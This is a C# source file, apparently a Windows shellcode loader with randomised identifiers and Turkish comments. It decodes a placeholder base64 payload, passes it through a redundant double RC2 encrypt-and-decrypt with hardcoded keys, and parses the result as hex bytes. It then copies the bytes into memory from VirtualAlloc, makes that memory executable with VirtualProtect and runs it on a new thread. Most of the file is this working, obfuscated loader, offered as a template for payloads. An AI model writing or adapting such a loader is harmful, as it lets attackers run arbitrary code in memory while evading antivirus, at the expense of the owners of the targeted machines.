using System;
using System.IO;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Text;
using System.Linq;
using System.Windows.Forms;

namespace JnSSwffRdKpR
{
    class CHXvHtlPw
    {
        [DllImport("kernel32")] private static extern IntPtr VirtualAlloc(UInt32 VcDNOCr, UInt32 NAFycyVpFfEKf, UInt32 zHVOZgZW, UInt32 cjVfiA);
        [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr VpeKeLmnd, uint CowjNtXGLZqL, uint cnamUIpAdpUrMsM, out uint UwyKnPcdDgqfm);
        [DllImport("kernel32")] private static extern IntPtr CreateThread(UInt32 LxkyGZrna, UInt32 ZUqGJF, IntPtr ldXoXrAZIqYp, IntPtr mYTTLbBaBIeQLHf, UInt32 cHzTQTzmiQNz, ref UInt32 mmluSfMJKRo);
        [DllImport("kernel32")] private static extern UInt32 WaitForSingleObject(IntPtr oaETDM, UInt32 dyhyOgQMEujvuMy);

        public static byte[] Byte8(string veri)
        {
            char[] ArrayChar = veri.ToCharArray();
            byte[] ArrayByte = new byte[ArrayChar.Length];
            for (int i = 0; i < ArrayChar.Length; i++)
            {
                ArrayByte[i] = Convert.ToByte(ArrayChar[i]);
            }
            return ArrayByte;
        }

        public static string RC2_Sifrele(string strGiris, string key)
        {
            byte[] aryKey = Byte8(key); // Key 8 bytes
            byte[] aryIV = Byte8(key);  // IV should also be 8 bytes
            RC2CryptoServiceProvider dec = new RC2CryptoServiceProvider();
            using (MemoryStream ms = new MemoryStream())
            {
                using (CryptoStream cs = new CryptoStream(ms, dec.CreateEncryptor(aryKey, aryIV), CryptoStreamMode.Write))
                {
                    using (StreamWriter writer = new StreamWriter(cs))
                    {
                        writer.Write(strGiris);
                    }
                }
                return Convert.ToBase64String(ms.ToArray());
            }
        }

        public static string RC2_Coz(string strGiris, string key)
        {
            byte[] aryKey = Byte8(key); // Key 8 bytes
            byte[] aryIV = Byte8(key);  // IV should also be 8 bytes
            RC2CryptoServiceProvider enc = new RC2CryptoServiceProvider();
            using (MemoryStream ms = new MemoryStream(Convert.FromBase64String(strGiris)))
            {
                using (CryptoStream cs = new CryptoStream(ms, enc.CreateDecryptor(aryKey, aryIV), CryptoStreamMode.Read))
                {
                    using (StreamReader reader = new StreamReader(cs))
                    {
                        return reader.ReadToEnd();
                    }
                }
            }
        }

        static void Main()
        {
            string base64Encoded = "a="; // Your base64 encoded string here
            string decodedString = Encoding.ASCII.GetString(Convert.FromBase64String(base64Encoded));

            // Encrypting with RC2
            string encrypted = RC2_Sifrele(decodedString, "12332489"); // Replace with your actual key

            // Encrypting the already encrypted data with another RC2 key
            string doubleEncrypted = RC2_Sifrele(encrypted, "12345654"); // Replace with your actual second key

            // Decrypting the double encrypted data
            string decryptedOnce = RC2_Coz(doubleEncrypted, "12345654"); // Use the second key
            string fullyDecrypted = RC2_Coz(decryptedOnce, "12332489"); // Use the first key

            // Memory manipulation code
            string[] chars = fullyDecrypted.Split(',').ToArray();
            byte[] TRjIDiwyWS = new byte[chars.Length];
            for (int i = 0; i < chars.Length; ++i) { TRjIDiwyWS[i] = Convert.ToByte(chars[i], 16); }
            IntPtr TCdulTDFAX = VirtualAlloc(0, (UInt32)TRjIDiwyWS.Length, 0x3000, 0x04);
            Marshal.Copy(TRjIDiwyWS, 0, (IntPtr)(TCdulTDFAX), TRjIDiwyWS.Length);
            IntPtr ZUEXoP = IntPtr.Zero; UInt32 zFMndilhU = 0; IntPtr mpIOkgInM = IntPtr.Zero;
            uint gbqnRitgZLxNw;
            bool VXDwurlILFwWx = VirtualProtect(TCdulTDFAX, (uint)0x1000, (uint)0x20, out gbqnRitgZLxNw);
            ZUEXoP = CreateThread(0, 0, TCdulTDFAX, mpIOkgInM, 0, ref zFMndilhU);
            WaitForSingleObject(ZUEXoP, 0xFFFFFFFF);

            // Wait for user input before closing
            Console.WriteLine("Programı kapatmak için bir tuşa basın...");
            Console.ReadKey();
        }
    }
}
